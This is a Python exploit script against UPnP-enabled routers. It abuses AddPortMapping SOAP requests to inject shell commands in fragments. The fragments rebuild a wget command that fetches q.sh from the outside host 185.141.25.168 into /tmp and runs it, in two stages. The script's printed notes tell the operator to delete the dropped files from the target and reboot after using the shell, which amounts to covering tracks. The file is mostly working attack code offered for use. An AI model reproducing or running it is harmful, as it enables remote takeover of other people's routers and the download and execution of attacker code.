# coding = utf-8


import requests
import time
import os
ip = input('enter target ip addr: ')

http_proxy  = "http://127.0.0.1:8080"
https_proxy = "https://127.0.0.1:8080"
ftp_proxy   = "ftp://127.0.0.1:8080"
proxyDict = {
			  "http"  : http_proxy,
			  "https" : https_proxy,
			  "ftp"   : ftp_proxy
			}
payload_1 = '''
;echo*'wget\'>>/tmp/a*;
;echo*' htt\'>>/tmp/a*;
;echo*'p://\'>>/tmp/a*;
;echo*'185.\'>>/tmp/a*;
;echo*'141.\'>>/tmp/a*;
;echo*'25.1\'>>/tmp/a*;
;echo*'68/q\'>>/tmp/a*;
;echo*'.sh \'>>/tmp/a*;
;echo*'-P /\'>>/tmp/a*;
;echo*'tmp\'>>/tmp/a*;
;519;*chmod +x /tmp/a*;
;762;*/tmp/a*;
'''

payload_2 = '''
;echo*'sh /\'>>/tmp/b*;
;echo*'tmp/\'>>/tmp/b*;
;echo*'q.sh'>>/tmp/b*;
;519;*chmod +x /tmp/b*;
;762;*/tmp/b*;
'''



# for add port mapping
headers1 = {
    'Accept': 'application/xml',
    'SOAPAction': '"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"',
    'Content-Type': 'text/xml',
    'Connection': 'Close',
}

# for delete port mapping
headers2 = {
    'Accept': 'application/xml',
    'SOAPAction': '"urn:schemas-upnp-org:service:WANIPConnection:1#DeletePortMapping"',
    'Content-Type': 'text/xml',
    'Connection': 'Close',
}


# NewExternalPort must be high port! Here is 55555
def add_port_mapping(external_port, new_ip, internal_port):
    print('[+]Mapping: ' + external_port + new_ip  + internal_port)
    content= '''
    <?xml version="1.0" ?>
        <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
        <s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
        <NewRemoteHost></NewRemoteHost>
        <NewExternalPort>%s</NewExternalPort>
        <NewProtocol>TCP</NewProtocol>
        <NewInternalPort>%s</NewInternalPort>
        <NewInternalClient>%s</NewInternalClient>
        <NewEnabled>1</NewEnabled>
        <NewPortMappingDescription>syncthing-0</NewPortMappingDescription>
        <NewLeaseDuration>0</NewLeaseDuration>
        </u:AddPortMapping></s:Body>
        </s:Envelope>
        '''%(external_port, internal_port, new_ip)
    try:
        r = requests.post(url=url, headers=headers1, data=content, proxies=proxyDict)
        print(r.status_code)
        if r.status_code == 200:
            print('OK')
    except Exception as e:
        print(str(e))



def dell_port_mapping(external_port, new_ip, internal_port):
    print('[+]Mapping: ' + external_port + new_ip  + internal_port)
    content= '''
    <?xml version="1.0" ?>
        <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
        <s:Body><u:DeletePortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
        <NewRemoteHost></NewRemoteHost>
        <NewExternalPort>%s</NewExternalPort>
        <NewProtocol>TCP</NewProtocol>
        <NewInternalPort>%s</NewInternalPort>
        <NewInternalClient>%s</NewInternalClient>
        <NewEnabled>1</NewEnabled>
        <NewPortMappingDescription>syncthing-0</NewPortMappingDescription>
        <NewLeaseDuration>0</NewLeaseDuration>
        </u:DeletePortMapping></s:Body>
        </s:Envelope>
        '''%(external_port, internal_port, new_ip)
    try:
        r = requests.post(url=url, headers=headers2, data=content, proxies=proxyDict)
        print(r.status_code)
        if r.status_code == 200:
            print('OK')
    except Exception as e:
        print(str(e))

def del_port_mapping(url, port):
    print('[+]delete Mapping...')
    content = '''
    <?xml version="1.0" ?>
        <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
        <s:Body><u:DeletePortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
        <NewRemoteHost></NewRemoteHost>
        <NewExternalPort>%s</NewExternalPort>
        <NewProtocol>TCP</NewProtocol>
        </u:DeletePortMapping></s:Body>
        </s:Envelope>
        ''' % port
    try:
        r = requests.post(url=url, headers=headers2, data=content, proxies=proxyDict)
        print(r.status_code)
        if r.status_code == 200:
            print('OK' + '\n')
    except Exception as e:
        print(str(e) + '\n')


# target upnp device ip
target_ip = str(ip)
# the url may be various form device to device
url = 'http://%s:49152/upnp/control/WANIPConn1' % target_ip

f = open('commands.txt', 'r')
lines = f.readlines()
f.close()

g = open('commands1.txt', 'r')
lines1 = g.readlines()
g.close

# first payload
for i in range(20):
    time.sleep(1)
    try:
        ex_port = lines[i].strip().split('*')[0]
  
        in_ip = lines[i].strip().split('*')[1]

        in_port = lines[i].strip().split('*')[2]

        add_port_mapping(ex_port, in_ip, in_port)
    except:
        print('command wrote in system.Deleting portmapping tables')
        pass



for i in range(20):
    time.sleep(1)
    try:
        ex_port = lines[i].strip().split('*')[0]
  
        in_ip = lines[i].strip().split('*')[1]

        in_port = lines[i].strip().split('*')[2]

        dell_port_mapping(ex_port, in_ip, in_port)
    except:
        print('command wrote in system.Deleting portmapping tables')
        pass

print('[+] ROUTE TABLE CLEAR.SERVER IS READY FOR INJECTING SECOND PAYLOAD.')

# Second payload

for i in range(20):
    time.sleep(1)
    try:
        ex_port = lines1[i].strip().split('*')[0]
  
        in_ip = lines1[i].strip().split('*')[1]

        in_port = lines1[i].strip().split('*')[2]

        add_port_mapping(ex_port, in_ip, in_port)
    except:
        print('command wrote in system.Deleting portmapping tables')
        pass
print('[!!!] DONT FORGET TO DELETE FROM TARGET OS FILES: a, b , q.sh, n')
print('[!!!] AFTER ENTERING TARGET SYSTEM FIRST USE COMMANDS: rm -rf a; rm -rf b; rm -rf q.sh, rm -rf n')
print("[!!!] THE MOST IMPORTANT THING: WHEN WANT TO QUIT FROM SHELL TYPE 'reboot'. IF DONT REBOOT TARGET ROUTER WILL FREEZE AND SHELL WILL BE UNREACHEBLE BEFOR ADMIN RESTART IT")
'''for i in range(20):
    try:
        ex_port = lines1[i].strip().split('*')[0]
  
        in_ip = lines1[i].strip().split('*')[1]

        in_port = lines1[i].strip().split('*')[2]

        dell_port_mapping(ex_port, in_ip, in_port)
    except:
        print('command wrote in system.Deleting portmapping tables')
        pass
target_clear_routetable = os.popen('iptables -I INPUT -s 89.29.237.252 -j DROP').read()
print('[+]TARGET IS BLOCKED ON IPTABLES. DOING ROUTE TABLE CLEAR')
time.sleep(15)
print('[+]ROUTE TABLE CLEAR.')
target_wright_routetable = os.popen('iptables -F').read()
print()'''




'''time.sleep(10)'''
'''for i in range(20):
    ex_port = lines[i].strip().split('*')[0]
    in_ip = lines[i].strip().split('*')[1]
    in_port = lines[i].strip().split('*')[2]
    dell_port_mapping(ex_port, in_ip, in_port)'''



